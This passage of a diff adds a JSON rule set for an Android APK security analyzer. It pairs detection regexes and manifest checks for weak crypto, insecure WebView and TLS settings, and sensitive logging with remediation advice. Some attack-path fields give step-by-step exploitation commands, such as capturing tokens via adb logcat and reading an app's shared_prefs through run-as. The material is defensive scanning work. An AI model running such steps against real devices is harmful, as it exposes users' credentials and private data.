@@ -1,0 +1,1461 @@
+{
+  "schema_version": "1.0.0",
+  "name": "APK Analyzer Security Patterns",
+  "description": "Comprehensive Android security vulnerability detection patterns",
+  "patterns": [
+    {
+      "id": "permission-dangerous-unused",
+      "title": "Dangerous Permission Requested",
+      "severity": "Info",
+      "category": "Permission",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [
+          {"xpath": ".//uses-permission[@android:name='android.permission.READ_CONTACTS']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.READ_CALENDAR']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.READ_CALL_LOG']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.READ_SMS']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.RECEIVE_SMS']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.RECORD_AUDIO']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.ACCESS_FINE_LOCATION']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.CAMERA']", "condition": "exists"}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-250"], "references": ["https://developer.android.com/guide/topics/permissions/overview#dangerous_permissions"], "confidence": "low"},
+      "description": "App requests dangerous permissions that provide access to sensitive user data. Verify these are necessary for app functionality.",
+      "attack_path": "If app is compromised, attacker gains access to sensitive data protected by these permissions.",
+      "remediation": "Only request permissions that are necessary. Request at runtime when needed, not at install time.",
+      "adb_category": "general",
+      "enabled": false,
+      "tags": ["permission", "dangerous", "privacy"]
+    },
+    {
+      "id": "permission-custom-signature",
+      "title": "Custom Permission Without Signature Protection",
+      "severity": "Medium",
+      "category": "Permission",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "<permission[^>]*android:protectionLevel\\s*=\\s*[\"'](?:normal|dangerous)[\"']", "flags": "i", "file_types": [".xml"]}]
+      },
+      "metadata": {"cwe": ["CWE-276"], "references": ["https://developer.android.com/guide/topics/manifest/permission-element"], "confidence": "medium"},
+      "description": "Custom permission uses normal or dangerous protection level. Any app can request this permission.",
+      "attack_path": "Malicious app requests the custom permission and gains access to protected components.",
+      "remediation": "Use android:protectionLevel=\"signature\" for custom permissions to restrict to apps signed with same certificate.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["permission", "custom", "signature"]
+    },
+    {
+      "id": "permission-install-packages",
+      "title": "Install Packages Permission",
+      "severity": "High",
+      "category": "Permission",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [
+          {"xpath": ".//uses-permission[@android:name='android.permission.INSTALL_PACKAGES']", "condition": "exists"},
+          {"xpath": ".//uses-permission[@android:name='android.permission.REQUEST_INSTALL_PACKAGES']", "condition": "exists"}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-250"], "confidence": "high"},
+      "description": "App can install other packages. This is a powerful capability that can be abused to install malware.",
+      "attack_path": "Compromised app downloads and installs malicious APK without user knowledge.",
+      "remediation": "Remove if not essential. Implement strict validation of APKs before installation.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["permission", "install", "malware"]
+    },
+    {
+      "id": "permission-system-alert-window",
+      "title": "System Alert Window Permission",
+      "severity": "High",
+      "category": "Permission",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [{"xpath": ".//uses-permission[@android:name='android.permission.SYSTEM_ALERT_WINDOW']", "condition": "exists"}]
+      },
+      "metadata": {"cwe": ["CWE-1021"], "references": ["https://developer.android.com/reference/android/Manifest.permission#SYSTEM_ALERT_WINDOW"], "confidence": "high"},
+      "description": "App can draw overlays on top of other apps. This enables tapjacking and UI spoofing attacks.",
+      "attack_path": "Malicious overlay tricks user into clicking hidden buttons or entering credentials in fake dialogs.",
+      "remediation": "Remove if not essential. Use this permission responsibly and inform users about overlay usage.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["permission", "overlay", "tapjacking"]
+    },
+    {
+      "id": "permission-bind-accessibility",
+      "title": "Accessibility Service Permission",
+      "severity": "High",
+      "category": "Permission",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [
+          {"xpath": ".//uses-permission[@android:name='android.permission.BIND_ACCESSIBILITY_SERVICE']", "condition": "exists"},
+          {"xpath": ".//service[@android:permission='android.permission.BIND_ACCESSIBILITY_SERVICE']", "condition": "exists"}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-250"], "references": ["https://developer.android.com/guide/topics/ui/accessibility/service"], "confidence": "high"},
+      "description": "App uses Accessibility Service which has extensive access to device including reading all screen content and simulating input.",
+      "attack_path": "Malicious accessibility service can read all text on screen including passwords, intercept OTPs, and automate malicious actions.",
+      "remediation": "Only use Accessibility Service for legitimate accessibility purposes. Clearly explain to users why it's needed.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["permission", "accessibility", "powerful"]
+    },
+    {
+      "id": "permission-device-admin",
+      "title": "Device Admin Permission",
+      "severity": "High",
+      "category": "Permission",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [
+          {"xpath": ".//uses-permission[@android:name='android.permission.BIND_DEVICE_ADMIN']", "condition": "exists"},
+          {"xpath": ".//receiver[@android:permission='android.permission.BIND_DEVICE_ADMIN']", "condition": "exists"}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-250"], "references": ["https://developer.android.com/guide/topics/admin/device-admin"], "confidence": "high"},
+      "description": "App uses Device Admin capabilities which provide extensive device control including wiping data and enforcing policies.",
+      "attack_path": "Malicious device admin can lock user out of device, wipe data, or enforce restrictive policies.",
+      "remediation": "Only use Device Admin for legitimate enterprise or security purposes. Clearly inform users of capabilities.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["permission", "device-admin", "powerful"]
+    },
+    {
+      "id": "logging-sensitive-data",
+      "title": "Sensitive Data in Logs",
+      "severity": "Medium",
+      "category": "Logging",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "Log\\.(?:d|i|v|w|e)\\s*\\([^)]*(?:password|token|secret|bearer|sessionId|accessToken|refreshToken|apiKey|privateKey)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "Timber\\.(?:d|i|v|w|e)\\s*\\([^)]*(?:password|token|secret|bearer|sessionId|accessToken|refreshToken)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-532", "CWE-200"], "references": ["https://developer.android.com/topic/security/best-practices#logging"], "confidence": "high"},
+      "description": "Authentication tokens, passwords, or session data appear in log statements. On Android <4.1, any app can read logs. Even on newer versions, logs are accessible via ADB, backup extraction, or if the device is compromised.",
+      "attack_path": "**Exploitation Steps:**\n1. Connect to device via ADB: `adb logcat`\n2. Filter for target app: `adb logcat --pid=$(adb shell pidof <package>)`\n3. Trigger authentication flow in the app\n4. Capture logged credentials/tokens from logcat output\n5. Use stolen tokens to impersonate user or access API",
+      "remediation": "1. Remove all sensitive data from log statements\n2. Use ProGuard/R8 rules to strip Log calls: `-assumenosideeffects class android.util.Log { *; }`\n3. Use Timber with a release Tree that filters sensitive data",
+      "adb_category": "logcat",
+      "enabled": true,
+      "tags": ["logging", "sensitive-data", "leak", "credentials"]
+    },
+    {
+      "id": "logging-debuggable-build",
+      "title": "Debuggable Build Detected",
+      "severity": "Critical",
+      "category": "Logging",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [{"xpath": ".//application[@android:debuggable='true']", "condition": "exists"}]
+      },
+      "metadata": {"cwe": ["CWE-489", "CWE-215"], "references": ["https://developer.android.com/guide/topics/manifest/application-element#debug"], "confidence": "high"},
+      "description": "Application has android:debuggable=\"true\". This is a critical security issue that allows complete compromise of the application.",
+      "attack_path": "**Exploitation Steps:**\n1. Access app's private data: `adb shell run-as <package> cat /data/data/<package>/shared_prefs/*.xml`\n2. Attach debugger to running process\n3. Inspect memory, modify variables, bypass authentication at runtime\n4. Extract encryption keys, tokens, and all sensitive data from memory",
+      "remediation": "1. Never set android:debuggable=\"true\" in release builds\n2. Use build variants: `buildTypes { release { debuggable false } }`",
+      "adb_category": "debug",
+      "enabled": true,
+      "tags": ["debug", "debuggable", "critical", "run-as"]
+    },
+    {
+      "id": "logging-network-traffic",
+      "title": "HTTP Traffic Body/Headers Logged",
+      "severity": "High",
+      "category": "Logging",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "HttpLoggingInterceptor\\s*\\([^)]*\\)\\.setLevel\\s*\\([^)]*(?:BODY|HEADERS)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "HttpLoggingInterceptor\\.Level\\.(?:BODY|HEADERS)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-532", "CWE-312"], "references": ["https://square.github.io/okhttp/features/interceptors/"], "confidence": "high"},
+      "description": "OkHttp HttpLoggingInterceptor is set to log BODY or HEADERS level in production. This logs all HTTP request/response data including authentication headers and sensitive payloads to logcat.",
+      "attack_path": "**Exploitation Steps:**\n1. Start logcat capture: `adb logcat -s OkHttp`\n2. Use the app normally, triggering API calls\n3. Observe logged Authorization headers, Cookie values, request/response bodies\n4. Extract tokens and replay requests",
+      "remediation": "1. Use NONE or BASIC level in release: `.setLevel(HttpLoggingInterceptor.Level.NONE)`\n2. Conditionally add interceptor: `if (BuildConfig.DEBUG) { client.addInterceptor(logging) }`",
+      "adb_category": "logcat",
+      "enabled": true,
+      "tags": ["logging", "network", "http", "okhttp"]
+    },
+    {
+      "id": "crypto-aes-ecb",
+      "title": "AES ECB Mode Detected",
+      "severity": "High",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"']AES/ECB", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"']AES[\"']\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-327"], "references": ["https://blog.oversecured.com/Use-cryptance-securely/"], "confidence": "high"},
+      "description": "AES in ECB mode preserves patterns in encrypted data. Identical plaintext blocks produce identical ciphertext blocks, leaking information about the data structure.",
+      "attack_path": "Attacker can analyze ciphertext patterns to infer plaintext structure, detect repeated data, or perform block manipulation attacks.",
+      "remediation": "Use AES/GCM/NoPadding or AES/CBC/PKCS5Padding with random IV. GCM is preferred as it provides authentication.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "aes", "ecb", "weak"]
+    },
+    {
+      "id": "crypto-des",
+      "title": "DES/3DES Weak Encryption",
+      "severity": "High",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"'](?:DES|DESede)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-327"], "confidence": "high"},
+      "description": "DES and 3DES are considered weak and deprecated. DES has a 56-bit key that can be brute-forced, and 3DES is vulnerable to Sweet32 attacks.",
+      "attack_path": "Attacker can brute-force DES encryption or use birthday attacks against 3DES to decrypt sensitive data.",
+      "remediation": "Use AES-256 with GCM mode instead of DES/3DES.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "des", "weak", "deprecated"]
+    },
+    {
+      "id": "crypto-rc4",
+      "title": "RC4 Stream Cipher",
+      "severity": "High",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"'](?:RC4|ARCFOUR)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-327"], "confidence": "high"},
+      "description": "RC4 is a broken stream cipher with known biases in its keystream. It should not be used for any security purpose.",
+      "attack_path": "Attacker can exploit statistical biases in RC4 keystream to recover plaintext.",
+      "remediation": "Use AES-GCM or ChaCha20-Poly1305 instead.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "rc4", "broken"]
+    },
+    {
+      "id": "crypto-md5-hash",
+      "title": "MD5 Hash Algorithm",
+      "severity": "Medium",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "MessageDigest\\.getInstance\\s*\\(\\s*[\"']MD5[\"']\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-328"], "confidence": "high"},
+      "description": "MD5 is cryptographically broken. Collision attacks are practical, making it unsuitable for security purposes like integrity verification or password hashing.",
+      "attack_path": "Attacker can create colliding inputs or use rainbow tables to reverse MD5 hashes.",
+      "remediation": "Use SHA-256 or SHA-3 for integrity checks. Use bcrypt, scrypt, or Argon2 for password hashing.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "hash", "md5", "weak"]
+    },
+    {
+      "id": "crypto-sha1-hash",
+      "title": "SHA-1 Hash Algorithm",
+      "severity": "Medium",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "MessageDigest\\.getInstance\\s*\\(\\s*[\"']SHA-?1[\"']\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-328"], "references": ["https://shattered.io/"], "confidence": "high"},
+      "description": "SHA-1 is deprecated due to practical collision attacks (SHAttered). It should not be used for security-critical purposes.",
+      "attack_path": "Attacker can create documents with the same SHA-1 hash (collision) for forgery or substitution attacks.",
+      "remediation": "Use SHA-256 or SHA-3 instead of SHA-1.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "hash", "sha1", "deprecated"]
+    },
+    {
+      "id": "crypto-insecure-random",
+      "title": "Insecure Random for Security Token",
+      "severity": "High",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "new\\s+Random\\s*\\([^)]*\\)[^;]*(?:token|secret|key|iv|nonce|salt|seed)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "(?:token|secret|key|iv|nonce|salt)\\s*=.*new\\s+Random", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-330"], "confidence": "high"},
+      "description": "java.util.Random used for generating security-sensitive values (tokens, keys, IVs). The output can be predicted by observing other values.",
+      "attack_path": "1. Observe multiple outputs from the PRNG\n2. Reconstruct internal state using known algorithms\n3. Predict future tokens/keys\n4. Forge authentication tokens or decrypt data",
+      "remediation": "Use java.security.SecureRandom for any security-related random number generation.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "random", "prng"]
+    },
+    {
+      "id": "crypto-hardcoded-key",
+      "title": "Hardcoded Encryption Key",
+      "severity": "Critical",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "SecretKeySpec\\s*\\(\\s*[\"'][^\"']+[\"']\\.getBytes", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "SecretKeySpec\\s*\\([^)]*new\\s+byte\\s*\\[\\s*\\]\\s*\\{[^}]+\\}", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-321"], "confidence": "high"},
+      "description": "Encryption key is hardcoded in source code. Anyone who decompiles the APK can extract the key and decrypt data.",
+      "attack_path": "Attacker decompiles APK, extracts hardcoded key, and decrypts all data encrypted with that key.",
+      "remediation": "Derive keys from user credentials using PBKDF2/scrypt/Argon2. Use Android Keystore for key storage. Generate unique keys per device/user.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "hardcoded", "key", "critical"]
+    },
+    {
+      "id": "crypto-hardcoded-iv",
+      "title": "Hardcoded or Static IV",
+      "severity": "High",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "IvParameterSpec\\s*\\(\\s*[\"'][^\"']+[\"']\\.getBytes", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "IvParameterSpec\\s*\\([^)]*new\\s+byte\\s*\\[\\s*\\]\\s*\\{[^}]+\\}", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-329"], "confidence": "high"},
+      "description": "Initialization Vector (IV) is hardcoded. Using the same IV with the same key allows attackers to detect repeated plaintexts and perform various cryptographic attacks.",
+      "attack_path": "With static IV, identical plaintexts produce identical ciphertexts. Attacker can detect patterns and potentially decrypt data.",
+      "remediation": "Generate a random IV for each encryption operation using SecureRandom. Store the IV with the ciphertext (it doesn't need to be secret).",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "iv", "hardcoded"]
+    },
+    {
+      "id": "crypto-no-integrity",
+      "title": "Encryption Without Integrity Check",
+      "severity": "Medium",
+      "category": "OWASP-M10-Cryptography",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"']AES/CBC/PKCS5Padding[\"']\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-353"], "confidence": "low"},
+      "description": "AES-CBC provides confidentiality but not integrity. Without authentication (MAC), attackers can modify ciphertext without detection.",
+      "attack_path": "Attacker can perform bit-flipping attacks or padding oracle attacks to modify or decrypt data.",
+      "remediation": "Use AES-GCM which provides both confidentiality and integrity. Alternatively, use Encrypt-then-MAC with HMAC-SHA256.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["crypto", "integrity", "mac"]
+    },
+    {
+      "id": "webview-js-interface",
+      "title": "WebView JavaScript Interface Enabled",
+      "severity": "High",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "addJavascriptInterface\\s*\\(", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-749"], "references": ["https://developer.android.com/develop/ui/views/layout/webapps/webview#BindingJavaScript", "https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "description": "A JavaScript interface is exposed to WebView content. This is a high-risk surface when combined with untrusted content or weak URL validation. On Android < 4.2, this allows arbitrary code execution via reflection.",
+      "attack_path": "1. Attacker tricks app into loading malicious URL in WebView\n2. Malicious JavaScript calls exposed interface methods\n3. Attacker gains access to app functionality or data",
+      "remediation": "1. Only expose necessary methods with @JavascriptInterface annotation\n2. Validate all URLs loaded in WebView\n3. Use postMessage API instead when possible",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "javascript", "rce", "xss"]
+    },
+    {
+      "id": "webview-js-enabled",
+      "title": "WebView JavaScript Enabled",
+      "severity": "Medium",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setJavaScriptEnabled\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-79"], "references": ["https://developer.android.com/develop/ui/views/layout/webapps/webview"], "confidence": "medium"},
+      "description": "JavaScript is enabled in WebView. When loading untrusted content, this can enable XSS-style attacks and access to exposed bridges.",
+      "attack_path": "Malicious webpage can execute scripts that interact with app via exposed bridges or steal sensitive data displayed in WebView.",
+      "remediation": "Only enable JavaScript when absolutely necessary. Validate all URLs loaded in WebView.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "javascript", "xss"]
+    },
+    {
+      "id": "webview-file-access-universal",
+      "title": "WebView Universal File Access Enabled",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setAllowUniversalAccessFromFileURLs\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-200", "CWE-22"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "description": "Universal file access from file URLs is enabled, allowing JavaScript in file:// context to access content from any origin including other file URLs. This can lead to local file theft.",
+      "attack_path": "1. Attacker tricks app into loading malicious HTML file\n2. JavaScript reads sensitive files (shared_prefs, databases)\n3. Data exfiltrated to attacker server",
+      "remediation": "Remove setAllowUniversalAccessFromFileURLs(true). Use setAllowFileAccessFromFileURLs(false) explicitly.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "file-access", "data-theft", "critical"]
+    },
+    {
+      "id": "webview-file-access-from-file",
+      "title": "WebView File Access From File URLs",
+      "severity": "High",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setAllowFileAccessFromFileURLs\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-200"], "confidence": "high"},
+      "description": "File access from file URLs is enabled. JavaScript running in file:// context can read other local files.",
+      "attack_path": "Attacker-controlled HTML loaded via file:// can read other local files and exfiltrate data.",
+      "remediation": "Set setAllowFileAccessFromFileURLs(false) explicitly.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "file-access"]
+    },
+    {
+      "id": "webview-file-access",
+      "title": "WebView Local File Access Enabled",
+      "severity": "Medium",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setAllowFileAccess\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-200"], "confidence": "medium"},
+      "description": "Local file access is allowed in WebView. If combined with untrusted content, it can expose local files.",
+      "attack_path": "Attacker-controlled content can attempt to load local files via file:// URIs.",
+      "remediation": "Set setAllowFileAccess(false) if file access is not needed.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "file-access"]
+    },
+    {
+      "id": "webview-mixed-content",
+      "title": "WebView Mixed Content Allowed",
+      "severity": "Medium",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "MIXED_CONTENT_ALWAYS_ALLOW", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-319"], "confidence": "high"},
+      "description": "Mixed content is allowed in WebView. This permits loading HTTP resources on HTTPS pages, enabling MITM injection.",
+      "attack_path": "Network attacker can inject malicious scripts via HTTP resources loaded on HTTPS pages.",
+      "remediation": "Use MIXED_CONTENT_NEVER_ALLOW or MIXED_CONTENT_COMPATIBILITY_MODE.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "mixed-content", "mitm"]
+    },
+    {
+      "id": "webview-dom-storage",
+      "title": "WebView DOM Storage Enabled",
+      "severity": "Low",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setDomStorageEnabled\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-922"], "confidence": "low"},
+      "description": "DOM storage is enabled. Attacker-controlled content can persist data in WebView storage.",
+      "attack_path": "Malicious content can store tracking data or payloads in DOM storage for later retrieval.",
+      "remediation": "Only enable DOM storage when needed. Clear storage on logout.",
+      "adb_category": "webview",
+      "enabled": false,
+      "tags": ["webview", "storage"]
+    },
+    {
+      "id": "webview-save-password",
+      "title": "WebView Password Saving Enabled",
+      "severity": "Medium",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setSavePassword\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-522"], "confidence": "high"},
+      "description": "Password saving is enabled in WebView. This deprecated API can leak credentials on older Android versions.",
+      "attack_path": "Credentials entered in WebView forms may be stored insecurely and extracted.",
+      "remediation": "Remove setSavePassword(true). This API is deprecated.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "credentials", "deprecated"]
+    },
+    {
+      "id": "webview-debug-enabled",
+      "title": "WebView Debugging Enabled",
+      "severity": "High",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "setWebContentsDebuggingEnabled\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-489"], "references": ["https://developer.chrome.com/docs/devtools/remote-debugging/webviews/"], "confidence": "high"},
+      "description": "WebView debugging is enabled, allowing Chrome DevTools to inspect WebView content via USB debugging.",
+      "attack_path": "Attacker with USB access can inspect WebView, execute JavaScript, and access session data.",
+      "remediation": "Only enable WebView debugging in debug builds: if (BuildConfig.DEBUG) { WebView.setWebContentsDebuggingEnabled(true); }",
+      "adb_category": "debug",
+      "enabled": true,
+      "tags": ["webview", "debug", "devtools"]
+    },
+    {
+      "id": "webview-ssl-error-proceed",
+      "title": "WebView SSL Error Handler Proceeds",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "onReceivedSslError[^}]*handler\\.proceed\\s*\\(\\s*\\)", "flags": "ims", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-295"], "references": ["https://developer.android.com/reference/android/webkit/WebViewClient#onReceivedSslError"], "confidence": "high"},
+      "description": "The WebView SSL error handler calls proceed(), ignoring certificate errors. This allows MITM attacks.",
+      "attack_path": "Network attacker can intercept HTTPS traffic with invalid certificate since errors are ignored.",
+      "remediation": "Always call handler.cancel() by default. Only proceed after explicit user confirmation for development purposes.",
+      "adb_category": "tls",
+      "enabled": true,
+      "tags": ["webview", "ssl", "tls", "mitm", "critical"]
+    },
+    {
+      "id": "network-trust-all-certs",
+      "title": "TrustManager Accepts All Certificates",
+      "severity": "Critical",
+      "category": "OWASP-M5-Communication",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "checkServerTrusted[^}]*\\{\\s*\\}", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "checkServerTrusted[^}]*\\{[^}]*//|checkServerTrusted[^}]*\\{\\s*return", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-295", "CWE-296"], "references": ["https://developer.android.com/training/articles/security-ssl"], "confidence": "high"},
+      "description": "Custom X509TrustManager with empty checkServerTrusted() method. This completely disables SSL/TLS certificate validation, allowing any certificate including self-signed and expired ones.",
+      "attack_path": "**MITM Attack:** Position on network, generate self-signed cert, start MITM proxy. App accepts fake cert, all HTTPS traffic is intercepted - steal credentials, tokens, modify responses.",
+      "remediation": "1. DELETE the custom TrustManager entirely\n2. Use Android's default certificate validation\n3. For additional security, implement certificate pinning",
+      "adb_category": "tls",
+      "enabled": true,
+      "tags": ["network", "tls", "ssl", "mitm", "critical"]
+    },
+    {
+      "id": "network-hostname-verifier-bypass",
+      "title": "Hostname Verification Disabled",
+      "severity": "Critical",
+      "category": "OWASP-M5-Communication",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "ALLOW_ALL_HOSTNAME_VERIFIER", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "HostnameVerifier[^}]*verify[^}]*return\\s+true", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-297"], "references": ["https://developer.android.com/training/articles/security-ssl#WarningsSslSocket"], "confidence": "high"},
+      "description": "Hostname verification is disabled. The app will accept valid certificates issued for ANY domain, not just the intended server.",
+      "attack_path": "Attacker with valid cert for attacker.com can impersonate api.example.com via DNS hijack.",
+      "remediation": "Remove ALLOW_ALL_HOSTNAME_VERIFIER. Use default HttpsURLConnection hostname verification.",
+      "adb_category": "tls",
+      "enabled": true,
+      "tags": ["network", "tls", "hostname", "mitm", "critical"]
+    },
+    {
+      "id": "network-cleartext-traffic",
+      "title": "Hardcoded HTTP URL (Cleartext)",
+      "severity": "Medium",
+      "category": "OWASP-M5-Communication",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "[\"']http://(?!localhost|127\\.0\\.0\\.1|10\\.|192\\.168\\.|0\\.0\\.0\\.0)[a-zA-Z0-9][a-zA-Z0-9.-]+\\.[a-z]{2,}", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-319", "CWE-311"], "references": ["https://developer.android.com/guide/topics/manifest/application-element#usesCleartextTraffic"], "confidence": "high"},
+      "description": "Hardcoded HTTP (non-HTTPS) URL found in code. Data sent over HTTP is transmitted in plaintext and can be intercepted on any network hop.",
+      "attack_path": "Connect to same network, capture HTTP traffic via Wireshark or MITM proxy. Capture credentials, tokens, API data.",
+      "remediation": "1. Replace all http:// URLs with https://\n2. Set android:usesCleartextTraffic=\"false\" in AndroidManifest.xml",
+      "adb_category": "tls",
+      "enabled": true,
+      "tags": ["network", "http", "cleartext"]
+    },
+    {
+      "id": "network-webview-ssl-proceed",
+      "title": "WebView SSL Error Ignored",
+      "severity": "Critical",
+      "category": "OWASP-M5-Communication",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "onReceivedSslError[^}]*handler\\.proceed\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "SslErrorHandler[^}]*\\.proceed\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-295"], "references": ["https://developer.android.com/reference/android/webkit/WebViewClient#onReceivedSslError"], "confidence": "high"},
+      "description": "WebView's onReceivedSslError calls handler.proceed() which ignores SSL certificate errors. This allows MITM attacks against all WebView traffic.",
+      "attack_path": "Set up MITM proxy with self-signed cert. WebView ignores SSL error, all content flows through attacker including OAuth pages, payment forms.",
